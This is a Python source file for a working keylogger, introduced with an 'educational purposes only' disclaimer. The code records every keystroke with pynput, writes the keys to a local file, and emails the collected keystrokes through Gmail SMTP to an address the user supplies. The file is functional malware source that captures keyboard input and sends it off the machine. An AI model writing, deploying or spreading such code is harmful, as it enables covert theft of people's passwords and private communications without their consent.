"""
This program will be used to create a keylogger with email capability for learning purposes.

WARNING: This program is for educational purposes only. Using it for any malicious intent is illegal and unethical.

It is your responsibility to use this program responsibly and in compliance with applicable laws and regulations.

By running this program, you acknowledge the potential risks and agree to use it ethically and responsibly.

"""

from pynput import keyboard #This module allows us to monitor and control keyboard input in Python scripts.
import smtplib #This module enables sending emails using Simple Mail Transfer Protocol (SMTP) in Python scripts.

class Keylogger:

    loggedKeys = " "

    @staticmethod
    def keyIsPressed(key):
        print(str(key)) #This is printing the keys that are being pressed.
        with open("keylog.txt", 'a') as logKey: #This file will store the keys being pressed. Each key will be appended to the text file.
            try:
                char = key.char
                logKey.write(char)
                Keylogger.loggedKeys += char #Append pressed key to loggedKeys.
            except AttributeError:
                print(key) #Printing special keys like enter, shift, etc.
    
    # Adding Email capability using the SMTP module.
    @staticmethod
    def emailSender():
        tcpPort = 587
        smtpServer = "smtp.gmail.com"
        senderEmail = input("Please enter your email: ")
        emailPassword = input("Please enter your password: ") #For GMAIL you will need to create an application specific password for the email to send.
        recipientEmail = input("Please enter the email you would like to send the file to: ")

        message = Keylogger.loggedKeys #Using the logged keys as a message.

        with smtplib.SMTP(smtpServer, tcpPort) as server:
            server.starttls() #TLS Encryption.
            server.login(senderEmail, emailPassword)
            server.sendmail(senderEmail, recipientEmail, message)
           

if __name__ == "__main__":
    listener = keyboard.Listener(on_press = Keylogger.keyIsPressed) #When the keyboard is pressed, send the key that was pressed to the keyIsPressed function.
    listener.start() #Listener is started for the keyboard.
    input()
    Keylogger.emailSender()
